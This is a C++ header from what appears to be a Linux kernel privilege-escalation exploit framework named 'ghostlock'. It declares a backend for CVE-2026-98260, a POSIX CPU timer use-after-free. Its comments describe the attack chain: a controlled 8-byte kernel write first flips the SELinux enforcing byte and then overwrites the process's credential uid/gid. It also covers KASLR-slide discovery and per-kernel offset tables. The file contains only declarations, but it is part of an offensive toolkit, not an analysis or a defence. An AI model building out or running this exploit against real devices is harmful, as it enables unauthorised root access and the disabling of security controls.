#ifndef GHOSTLOCK_CVE2026_98260_BACKEND_HPP
#define GHOSTLOCK_CVE2026_98260_BACKEND_HPP

#include "profile/model.h"
#include "route/backend_policy.hpp"
#include "route/component_catalog.hpp"
#include "session/exploit_session.hpp"
#include "session/stage_types.hpp"
#include "support/status.hpp"

namespace ghostlock::session::backend {
    /* CVE-2026-98260 backend: POSIX CPU timer UAF (stale timerqueue node ->
     * one controlled 8-byte store on zombie reap).
     *
     * Shape is deliberately the same as Cve2026_43499Policy: the catalogue and
     * the pipeline only ever see an id plus `run<Middleware>`. This backend
     * does not use the futex middleware at all - it runs its own two-phase
     * sequence (SELinux enforcing byte, then this process' cred uid/gid) and
     * returns Done when a phase succeeded, because the terminal objective is
     * reached inside the backend (no root-child handoff is involved).
     *
     * Every kernel-specific constant lives in kernel/timer_kbuilds.h, keyed by
     * an exact `uname -r`. A build without a table entry is refused before any
     * privileged action, never approximated. */
    struct Cve2026_98260Policy final {
        static constexpr runtime::BackendKind kind = runtime::BackendKind::Cve2026_98260;

        template <class Middleware>
        [[nodiscard]] static StageResult run(ExploitSession &session,
                                             const profile::kernel_offsets &decoded,
                                             const char *debug_dir, bool force_attack,
                                             VictimChain &chain);

        /* Environment and channel setup: identity, page size, live slab
         * geometry, tracefs handles, KASLR slide. Failed means "do not attack
         * on this device"; the caller must not retry with other primitives. */
        [[nodiscard]] static StageResult run_setup(ExploitSession &session,
                                                   const profile::kernel_offsets &decoded,
                                                   const char *debug_dir, bool force_attack);
    };

    static_assert(Cve2026_98260Policy::kind == runtime::backend::Cve2026_98260::kind);
    static_assert(runtime::backend_available(Cve2026_98260Policy::kind));
} // namespace ghostlock::session::backend

#endif
